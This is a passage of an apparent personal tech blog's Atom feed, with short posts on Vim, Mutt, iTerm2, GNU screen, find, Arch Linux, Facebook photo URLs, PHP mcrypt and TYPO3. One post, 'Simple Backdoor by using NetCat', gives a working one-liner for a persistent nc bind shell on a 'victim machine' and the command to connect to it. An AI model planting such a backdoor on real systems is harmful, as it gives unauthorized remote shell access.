      &lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="nx"&gt;item&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;replace&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="sr"&gt;/^ {1,4}/gm&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;  
&lt;span class="p"&gt;}&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;And if we &lt;code&gt;:set cpoptions&amp;amp;vi&lt;/code&gt; to change cpoptions let Vim act like VI, the result seems correct.  &lt;/p&gt;
&lt;p&gt;But after read the doc in Vim, proved it was a coincidence because VI just treat this pattern a PLAINTEXT without considering parens in &lt;code&gt;“”&lt;/code&gt; or &lt;code&gt;''&lt;/code&gt;. So, if you remove one of the parens, the result get wrong again.  &lt;/p&gt;
&lt;p&gt;What I am curious about is that the default syntax highlighting is correct but the % action is wrong in Vim with such pattern.  &lt;/p&gt;
&lt;p&gt;I know install a plugin like matchit can probably resolve this problem. But is there any built-in method to deal with it?  &lt;/p&gt;
&lt;p&gt;My friend found this problem while he was trying to fold his code and got an unpredictable result.  &lt;/p&gt;
&lt;h3&gt;References&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://stackoverflow.com/questions/1903225/vim-finds-incorrect-matching-bracket-when-using"&gt;Vim finds incorrect matching bracket when using %&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;</summary><category term="Vim"></category></entry><entry><title>Delete all mails in Mutt</title><link href="https://blog.m157q.tw/posts/2014/08/01/delete-all-mails-in-mutt/" rel="alternate"></link><published>2015-10-26T14:51:00+08:00</published><updated>2015-10-26T14:51:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2014-08-01:posts/2014/08/01/delete-all-mails-in-mutt/</id><summary type="html">&lt;h2&gt;How-to&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;&lt;code&gt;D&lt;/code&gt; - press &lt;strong&gt;Shift-d&lt;/strong&gt; (delete pattern)  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;~s .*&lt;/code&gt; then press &lt;strong&gt;enter&lt;/strong&gt;. Mutt will flag all mail with a D.  &lt;ul&gt;
&lt;li&gt;or just &lt;code&gt;.*&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;q&lt;/code&gt; to quit mutt  &lt;ul&gt;
&lt;li&gt;confirm deletion before exit.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;another way  &lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;code&gt;T&lt;/code&gt; - tag pattern mode  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;~s .*&lt;/code&gt; -  tag all mails  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;;d&lt;/code&gt; - delete tagged mails  &lt;/li&gt;
&lt;li&gt;$ (&lt;strong&gt;Shift+4&lt;/strong&gt;) - to sync change to your mailbox or &lt;code&gt;q&lt;/code&gt; to quit mutt  &lt;/li&gt;
&lt;/ol&gt;
&lt;hr /&gt;
&lt;h2&gt;Reference&lt;/h2&gt;
&lt;p&gt;&lt;a href="http://major.io/2009/06/19/deleting-all-e-mail-messages-in-your-inbox-with-mutt/"&gt;Deleting all e-mail messages in your inbox with mutt&lt;/a&gt;  &lt;/p&gt;</summary><category term="CLI"></category><category term="Mutt"></category></entry><entry><title>Use Option Key as Meta in iTerm2 and Terminal on Mac</title><link href="https://blog.m157q.tw/posts/2014/07/09/use-option-key-as-meta-in-iterm2-and-terminal-on-mac/" rel="alternate"></link><published>2014-07-09T18:46:00+08:00</published><updated>2014-07-09T18:46:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2014-07-09:posts/2014/07/09/use-option-key-as-meta-in-iterm2-and-terminal-on-mac/</id><summary type="html">&lt;p&gt;I am learning some bash shortcut keys in emacs mode in order to become a better sysytem administrator and just found that Alt+* shortcut keys can't be used in my MacBook Air within iTerm2 and default Terminal.  &lt;/p&gt;
&lt;p&gt;Here are solutions below.  &lt;/p&gt;
&lt;!--more--&gt;

&lt;hr /&gt;
&lt;h3&gt;iTerm2&lt;/h3&gt;
&lt;p&gt;According to this post &lt;a href="http://stackoverflow.com/questions/18923765/bash-keyboard-shortcuts-in-iterm-like-altd-and-altf"&gt;Bash keyboard shortcuts in iTerm like Alt+d and Alt+f &lt;/a&gt;.  &lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;code&gt;Command + O&lt;/code&gt; to open the iTerm2 profiles  &lt;/li&gt;
&lt;li&gt;Click Edit Profiles  &lt;/li&gt;
&lt;li&gt;Choose left option key as &lt;code&gt;+Esc&lt;/code&gt; or both left and right option key on the bottom right corner  &lt;/li&gt;
&lt;li&gt;Close the iTerm2 Profiles  &lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;It should works.  &lt;/p&gt;
&lt;hr /&gt;
&lt;h3&gt;Terminal&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;&lt;code&gt;Command + ,&lt;/code&gt; to open the Settings of Terminal  &lt;/li&gt;
&lt;li&gt;Check &lt;code&gt;Use option as meta key&lt;/code&gt; on the bottom  &lt;/li&gt;
&lt;li&gt;Close Terminal Settings  &lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;It should works.  &lt;/p&gt;</summary><category term="Mac"></category><category term="terminal"></category><category term="iTerm2"></category><category term="MetaKey"></category><category term="OptionKey"></category></entry><entry><title>Simple Backdoor by using NetCat</title><link href="https://blog.m157q.tw/posts/2014/07/06/simple-backdoor-by-using-netcat/" rel="alternate"></link><published>2015-10-27T12:13:00+08:00</published><updated>2015-10-27T12:13:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2014-07-06:posts/2014/07/06/simple-backdoor-by-using-netcat/</id><summary type="html">&lt;h2&gt;The one line script&lt;/h2&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ nohup bash -c &lt;span class="s1"&gt;&amp;#39;while true; do nc -l -e /bin/bash -p ${port}; done&amp;#39;&lt;/span&gt; &lt;span class="p"&gt;&amp;amp;&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;How this works&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;nohup&lt;/code&gt; makes this backdoor immune to SIGHUP  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;bash -c ${string}&lt;/code&gt; will run the &lt;code&gt;${string}&lt;/code&gt; as command  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;nc -l&lt;/code&gt; let nc keep listening on the port  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;nc -e ${sth}&lt;/code&gt; means excute &lt;code&gt;${sth}&lt;/code&gt; after connected  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;nc -p&lt;/code&gt; to choose a port for nc to listen  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;${port}&lt;/code&gt; is the backdoor port set on the victim machine.  &lt;ul&gt;
&lt;li&gt;You can change it to a port number whatever you like.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;use shell scripting &lt;code&gt;while&lt;/code&gt; for keeping listening  &lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;How to use&lt;/h2&gt;
&lt;p&gt;After run the command above on the victim machine, you can just type  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ nc &lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;victim_ip&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt; &lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;port&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;to connect to the victim machine and get a bash shell as the same uid which ran the command.  &lt;/p&gt;</summary><category term="NetCat"></category><category term="nc"></category><category term="Backdoor"></category><category term="Security"></category></entry><entry><title>Screen copy mode scrollback 行數不夠</title><link href="https://blog.m157q.tw/posts/2014/05/27/not-enough-lines-for-scrollback-in-screen-copy-mode/" rel="alternate"></link><published>2015-10-28T14:21:00+08:00</published><updated>2015-10-28T14:21:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2014-05-27:posts/2014/05/27/not-enough-lines-for-scrollback-in-screen-copy-mode/</id><summary type="html">&lt;p&gt;今天剛好有兩個人都問了這個問題  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;「screen 可以回捲的行數不夠怎麼辦?」  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;所以就寫下來記錄一下&lt;br /&gt;
--其實是直接複製貼上--  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;第一種解法：跟 screen 無關&lt;/h2&gt;
&lt;p&gt;關於您的問題應該是不用升級版本就可以解決的&lt;br /&gt;
只要將您的指令 pipe 給 less  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ &lt;span class="o"&gt;(&lt;/span&gt;Your &lt;span class="nb"&gt;command&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; less  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;或是使用 &lt;code&gt;&amp;gt;&lt;/code&gt; 將程式的輸出結果導到某個檔案中  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ &lt;span class="o"&gt;(&lt;/span&gt;Your &lt;span class="nb"&gt;command&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &amp;gt; &lt;span class="nv"&gt;$file&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;再使用 &lt;code&gt;less&lt;/code&gt; 或是您慣用的編輯器開啟  &lt;/p&gt;
&lt;p&gt;&lt;code&gt;less $file&lt;/code&gt;, &lt;code&gt;vim $file&lt;/code&gt;, &lt;code&gt;emacs $file&lt;/code&gt;, ...  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;第二種解法：從 screen 的設定下手&lt;/h2&gt;
&lt;p&gt;如果您想要從 screen 的方面下手的話&lt;br /&gt;
可以參考 &lt;a href="http://www.gnu.org/software/screen/manual/screen.html"&gt;http://www.gnu.org/software/screen/manual/screen.html&lt;/a&gt;  &lt;/p&gt;
&lt;h3&gt;情況一：仍未開啟 screen&lt;/h3&gt;
&lt;p&gt;在開啟 &lt;code&gt;screen&lt;/code&gt; 的時候 加上 &lt;code&gt;-h $num&lt;/code&gt;  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;$num&lt;/code&gt; 代表可以往上捲幾行  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;code&gt;screen&lt;/code&gt; 預設為 100  &lt;/p&gt;
&lt;h3&gt;情況二：已經開啟 screen&lt;/h3&gt;
&lt;p&gt;如果已經開啟 &lt;code&gt;screen&lt;/code&gt; 的話&lt;br /&gt;
可以在 &lt;code&gt;screen&lt;/code&gt; 的 cli 環境中輸入  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;:defscrollback $num  
&lt;/pre&gt;&lt;/div&gt;


&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;$num&lt;/code&gt; 一樣代表可以往上捲幾行  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;則新開啟的 &lt;code&gt;screen&lt;/code&gt; 分頁會套用此設定  &lt;/p&gt;</summary><category term="CLI"></category><category term="screen"></category><category term="copy mode"></category><category term="history buffer"></category></entry><entry><title>find 指令排除指定路徑</title><link href="https://blog.m157q.tw/posts/2014/05/21/exclude-path-in-find-command/" rel="alternate"></link><published>2015-10-28T14:29:00+08:00</published><updated>2015-10-28T14:29:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2014-05-21:posts/2014/05/21/exclude-path-in-find-command/</id><summary type="html">&lt;p&gt;為了寫作業用到的&lt;br /&gt;
參考 &lt;a href="http://stackoverflow.com/questions/4210042/exclude-directory-from-find-command"&gt;linux - Exclude directory from find . command - Stack Overflow&lt;/a&gt;  &lt;/p&gt;
&lt;p&gt;基本上就是  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ find &lt;span class="nv"&gt;$target_path&lt;/span&gt; -path &lt;span class="nv"&gt;$exclude_path&lt;/span&gt; -prune -o &lt;span class="o"&gt;[&lt;/span&gt;condition&lt;span class="o"&gt;]&lt;/span&gt; -print  
&lt;/pre&gt;&lt;/div&gt;


&lt;hr /&gt;
&lt;p&gt;我自己的用法是  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ find / -path /proc -prune -o -perm &lt;span class="nv"&gt;o&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;w -type f -print  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;用來 print 出整個 &lt;code&gt;/&lt;/code&gt; 底下除了 &lt;code&gt;/proc&lt;/code&gt; 以外所有的 global writable 的 file  &lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;解答中甚至給出了要排除多個資料夾路徑的寫法  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;find &lt;span class="nv"&gt;$target_path&lt;/span&gt; -type d &lt;span class="se"&gt;\(&lt;/span&gt; -path &lt;span class="nv"&gt;$exclude_path1&lt;/span&gt; -o -path &lt;span class="nv"&gt;$exclude_path2&lt;/span&gt; -o -path &lt;span class="nv"&gt;$exclude_path3&lt;/span&gt; &lt;span class="se"&gt;\)&lt;/span&gt; -prune -o -print  
&lt;/pre&gt;&lt;/div&gt;


&lt;hr /&gt;
&lt;h2&gt;Appendix&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;-prune&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;This primary always evaluates to true.  It causes find to not descend into the current file.  Note, the -prune primary has no effect if the -d option was specified.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;</summary><category term="CLI"></category><category term="find"></category><category term="sysadmin"></category></entry><entry><title>GHC 7.8.2 造成 Arch Linux 無法升級的解法</title><link href="https://blog.m157q.tw/posts/2014/05/21/the-solution-for-system-upgrade-failure-caused-by-ghc-7-8-2/" rel="alternate"></link><published>2015-10-27T13:10:00+08:00</published><updated>2015-10-27T13:10:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2014-05-21:posts/2014/05/21/the-solution-for-system-upgrade-failure-caused-by-ghc-7-8-2/</id><summary type="html">&lt;p&gt;官方公告 &lt;a href="https://www.archlinux.org/news/managing-haskell-packages-with-ghc-782/"&gt;Managing Haskell packages with GHC 7.8.2&lt;/a&gt;  &lt;/p&gt;
&lt;p&gt;裡面寫了  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Moving every package that is not ghc or cabal-install to [community]. This will allow better support of the core common haskell libraries since I do not actually use these packages due to cabal-install.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;其實我根本看不懂該怎麼做= ="&lt;br /&gt;
反正我一定不是唯一一個看不懂的(?)&lt;br /&gt;
所以就查到了這篇 &lt;a href="https://bbs.archlinux.org/viewtopic.php?pid=1412908"&gt;[SOLVED] Problems upgrading some haskell packages&lt;/a&gt;&lt;br /&gt;
遇到的情形似乎跟我一樣&lt;br /&gt;
下了 &lt;code&gt;sudo pacman -Syu&lt;/code&gt; 後噴了  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;:: haskell-transformers: requires ghc=7.6.3-1  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;然後  &lt;code&gt;pacman -Qs ghc&lt;/code&gt; 後也一樣已經安裝了&lt;br /&gt;
然後底下有人提供了解法  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;sudo pacman -Rcs haskell-transformers  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;把跟 &lt;code&gt;haskell-transformers&lt;/code&gt; 有關的套件都移除掉以後&lt;br /&gt;
再重新下一次 &lt;code&gt;sudo pacman -Syu&lt;/code&gt; 就可以了  &lt;/p&gt;
&lt;p&gt;底下的回覆有人的解釋是  &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;haskell-transformers was recently removed from extra.&lt;br /&gt;
It depends on a specific version of ghc.&lt;br /&gt;
There is a newer version of ghc in the repos.&lt;br /&gt;
Since haskell-transformers was removed there's no upgrade path to resolve the issue.&lt;br /&gt;
You'll have to do it manually.&lt;br /&gt;
Edit: Removed from the repos entirely.&lt;br /&gt;
Not moved from extra to community like the other haskell packages.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;恩 應該就是這樣吧  &lt;/p&gt;</summary><category term="Linux"></category><category term="Haskell"></category><category term="Arch Linux"></category><category term="GHC"></category><category term="sysadmin"></category></entry><entry><title>Something about Facebook Photo URL</title><link href="https://blog.m157q.tw/posts/2014/04/15/something-about-facebook-photo-url/" rel="alternate"></link><published>2015-10-26T14:57:00+08:00</published><updated>2015-10-26T14:57:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2014-04-15:posts/2014/04/15/something-about-facebook-photo-url/</id><summary type="html">&lt;p&gt;有 Facebook 相關開發經驗的應該就不必看了  &lt;/p&gt;
&lt;p&gt;以最近很紅的一段網址來舉例  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;https://www.facebook.com/photo.php?fbid=710043139058199&amp;amp;set=a.231514793577705.59041.100001575585223&amp;amp;type=1  
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;其中 &lt;code&gt;fbid=710043139058199&lt;/code&gt;，710043139058199 為此照片的ID，把這串數字接在 &lt;code&gt;www.facebook.com/&lt;/code&gt; 後面，就會連到該張照片的網址。ex: &lt;a href="https://www.facebook.com/710043139058199"&gt;https://www.facebook.com/710043139058199&lt;/a&gt; (看不到別怪我) (非循序流水號，估計跟使用者有關係)  &lt;/li&gt;
&lt;li&gt;再來是 &lt;code&gt;set=a.231514793577705.59041.100001575585223&lt;/code&gt;，這邊可以看到三串數字，分別由 . 隔開。  &lt;ul&gt;
&lt;li&gt;a 估計為 Album 的意思  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;231514793577705&lt;/code&gt; 代表該相片所在的相簿。接在 &lt;code&gt;www.facebook.com/&lt;/code&gt; 後面，可以直接連結到該相簿。 ex:&lt;a href="https://www.facebook.com/231514793577705"&gt;https://www.facebook.com/231514793577705&lt;/a&gt; (看不到也別怪我)  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;59041&lt;/code&gt; 目前未知  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;100001575585223&lt;/code&gt; 代表照片上傳者的 Facebook uid。 接在 &lt;code&gt;www.facebook.com/&lt;/code&gt; 後面，可以直接連結到該使用者的 Facebook 頁面。 ex:&lt;a href="https://www.facebook.com/100001575585223"&gt;https://www.facebook.com/100001575585223&lt;/a&gt; (看不到還是別怪我)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;type 只是相片檢視的模式，不重要。  &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;上面三種不同的連結必須在該使用者有開放相對應的瀏覽權限才看得到  &lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;另外有一種長這樣，這種應該比較少看到。  &lt;/p&gt;
&lt;p&gt;&lt;code&gt;https://www.facebook.com/photo.php?fbid=A&amp;amp;set=t.B&amp;amp;type=3&amp;amp;theater&lt;/code&gt;  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;fbid=A&lt;/code&gt;: A 和上述的一樣，不再進行贅述。  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;set=t.B&lt;/code&gt;  &lt;ul&gt;
&lt;li&gt;t 估計為 timeline 的意思  &lt;/li&gt;
&lt;li&gt;而 B 也會是某個使用者的 Facebook uid。前面接上 &lt;code&gt;www.facebook.com/&lt;/code&gt; 一樣可以連結到該使用者的 Facebook 個人頁面。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;以上自己無聊試出來的  &lt;/p&gt;
&lt;p&gt;其中 Facebook uid 是流水號，也就是相鄰的數字都會是某個 FB 使用者。&lt;br /&gt;
這個我想很多人應該都知道。  &lt;/p&gt;
&lt;p&gt;然後官方提供的 &lt;a href="http://graph.facebook.com"&gt;http://graph.facebook.com&lt;/a&gt; 不錯用&lt;br /&gt;
後面接上 /id 就會有 Open Graph 的資料出現&lt;br /&gt;
(官方工具是在 &lt;a href="https://developers.facebook.com/tools/explorer/"&gt;https://developers.facebook.com/tools/explorer/&lt;/a&gt; 須登入才能使用)&lt;br /&gt;
雖然這部分也會有預設權限就是&lt;br /&gt;
只要對方沒開放瀏覽權限，一樣看不到  &lt;/p&gt;
&lt;p&gt;有空再來 Google 相關的東西或者翻翻 Facebook API 之類的文件，也許會有啥收穫。  &lt;/p&gt;</summary><category term="facebook"></category><category term="URL"></category></entry><entry><title>Enable mCrypt in PHP5 on Ubuntu 13.10 for Apache</title><link href="https://blog.m157q.tw/posts/2014/03/27/enable-mcrypt-in-php5-on-ubuntu-1310-for-apache/" rel="alternate"></link><published>2015-10-26T14:59:00+08:00</published><updated>2015-10-26T14:59:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2014-03-27:posts/2014/03/27/enable-mcrypt-in-php5-on-ubuntu-1310-for-apache/</id><summary type="html">&lt;p&gt;剛剛室友問網安作業  &lt;/p&gt;
&lt;p&gt;弄了老半天 網頁都是一片空白  &lt;/p&gt;
&lt;p&gt;後來乾脆直接寫在 .php 裏面  &lt;/p&gt;
&lt;p&gt;然後用 command line php 執行  &lt;/p&gt;
&lt;p&gt;結果問題出在  &lt;/p&gt;
&lt;p&gt;&lt;code&gt;PHP Fatal Error: Undefined function mcrypt_encrypt()&lt;/code&gt;  &lt;/p&gt;
&lt;p&gt;看起來就是 mcrypt module 沒被 include 進來  &lt;/p&gt;
&lt;p&gt;環境是 Ubuntu 13.10  &lt;/p&gt;
&lt;p&gt;開 &lt;code&gt;/etc/php5/apache2/php.ini&lt;/code&gt; 也沒看到 &lt;code&gt;mcrypt.so&lt;/code&gt; 可以拿掉註解  &lt;/p&gt;
&lt;p&gt;最後請教 Google 大神  &lt;/p&gt;
&lt;p&gt;發現這篇 &lt;a href="http://stackoverflow.com/questions/19446679/mcrypt-not-present-after-ubuntu-upgrade-to-13-10"&gt;mCrypt not present after Ubuntu upgrade to 13.10&lt;/a&gt;  &lt;/p&gt;
&lt;p&gt;看起來是 Ubuntu 13.10 特有的問題 應該是位置改了之類的吧  &lt;/p&gt;
&lt;p&gt;底下有回應提到解法  &lt;/p&gt;
&lt;p&gt;簡記一下：  &lt;/p&gt;
&lt;hr /&gt;
&lt;ol&gt;
&lt;li&gt;&lt;code&gt;$ sudo apt-get install php5-mcrypt&lt;/code&gt; 確認有安裝 &lt;code&gt;php5-mcrypt&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;$ sudo ln -s /etc/php5/conf.d/mcrypt.ini /etc/php5/mods-available&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;$ sudo php5enmod mcrypt&lt;/code&gt; 這個指令會自動幫你在 &lt;code&gt;/etc/php5/apache2/conf.d&lt;/code&gt; 底下建一個 &lt;code&gt;mcrypt.ini&lt;/code&gt; 指向 &lt;code&gt;/etc/php5/mods-available/mcrypt.ini&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;$ sudo service apache2 restart&lt;/code&gt; 重啟 Apache server  &lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;應該就可以在網頁上順利使用 mcrypt 系列的 function 了  &lt;/p&gt;
&lt;hr /&gt;
&lt;h4&gt;--珍惜生命，遠離 Ubuntu--&lt;/h4&gt;
&lt;hr /&gt;
&lt;h2&gt;Reference&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://stackoverflow.com/questions/19446679/mcrypt-not-present-after-ubuntu-upgrade-to-13-10"&gt;mCrypt not present after Ubuntu upgrade to 13.10&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;</summary><category term="PHP"></category><category term="Ubuntu"></category><category term="Apache"></category><category term="mCrypt"></category><category term="sysadmin"></category></entry><entry><title>TYPO3 CMS</title><link href="https://blog.m157q.tw/posts/2014/03/03/typo3-cms/" rel="alternate"></link><published>2015-10-26T15:10:00+08:00</published><updated>2015-10-26T15:10:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2014-03-03:posts/2014/03/03/typo3-cms/</id><summary type="html">&lt;p&gt;Introduction to &lt;a href="https://typo3.org/"&gt;TYPO3&lt;/a&gt; by &lt;a href="https://twitter.com/keinerweiss"&gt;Rüdiger Marwein&lt;/a&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;ul&gt;
&lt;li&gt;Why name &lt;a href="https://typo3.org/"&gt;TYPO3&lt;/a&gt;?  &lt;ul&gt;
&lt;li&gt;Because the author deleted the project unintentionally &lt;strong&gt;TWICE&lt;/strong&gt;, so it called &lt;strong&gt;TYPO3&lt;/strong&gt; .  &lt;/li&gt;
&lt;li&gt;Developed by PHP.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;TYPO3 Association  &lt;ul&gt;
&lt;li&gt;Enables developers to contribute  &lt;/li&gt;
&lt;li&gt;Ensures stable release cycle  &lt;/li&gt;
&lt;li&gt;Provides certification program  &lt;/li&gt;
&lt;li&gt;Organizes community events  &lt;ul&gt;
&lt;li&gt;TYPO3 conference  &lt;/li&gt;
&lt;li&gt;T3BOARD  &lt;/li&gt;
&lt;li&gt;Developer Day  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Open Source Community  &lt;ul&gt;
&lt;li&gt;Strongest participation concentrated in Germany, Switzerland, Austria  &lt;/li&gt;
&lt;li&gt;Global approach  &lt;ul&gt;
&lt;li&gt;software available in 50+ languages  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Content Management System (CMS) of TYPO3  &lt;ul&gt;
&lt;li&gt;To separate content from layout  &lt;/li&gt;
&lt;li&gt;6000+ extensions in the repo  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Skill-levels for TYPO3 CMS  &lt;ul&gt;
&lt;li&gt;Integrator  &lt;ul&gt;
&lt;li&gt;Setup, configuration management  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Extension Developer  &lt;ul&gt;
&lt;li&gt;Create extensions by using the framework  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Editor  &lt;ul&gt;
&lt;li&gt;Create and edit content  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;TypoScript  &lt;ul&gt;
&lt;li&gt;Users Can change configuration without write any PHP code.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Enterprise CMS  &lt;ul&gt;
&lt;li&gt;Unlimited users &amp;amp; groups  &lt;/li&gt;
&lt;li&gt;Multiple clients in one system  &lt;/li&gt;
&lt;li&gt;Multiple domains manageable  &lt;/li&gt;
&lt;li&gt;Flexible configuration, even for core features.(by TypoScript)  &lt;/li&gt;
&lt;li&gt;Extensibility  &lt;/li&gt;
&lt;li&gt;Inexpensive upgrade &amp;amp; migration  &lt;ul&gt;
&lt;li&gt;use symbolic link  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Release schedule  &lt;/li&gt;
&lt;li&gt;Security-team &amp;amp; -workflow for core + extensions  &lt;ul&gt;
&lt;li&gt;If you find a security hole, you can email the Security team, the team will deal with it.  &lt;/li&gt;
&lt;li&gt;A big issue will be solved in 24 hours as soon as possible and release an update.  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Core Features  &lt;ul&gt;
&lt;li&gt;Enable / Disable pages or content  &lt;/li&gt;
&lt;li&gt;Time based hide / show  &lt;/li&gt;
&lt;li&gt;Global &amp;amp; local content  &lt;ul&gt;
&lt;li&gt;Referencing content  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Many content element types  &lt;ul&gt;
&lt;li&gt;Text / image combinations  &lt;/li&gt;
&lt;li&gt;Menus &amp;amp; link lists  &lt;/li&gt;
&lt;li&gt;Multi-column content  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Media management  &lt;/li&gt;
&lt;li&gt;Versioning  &lt;/li&gt;
&lt;li&gt;HMAC-based security  &lt;/li&gt;
&lt;li&gt;Extension concept  &lt;/li&gt;
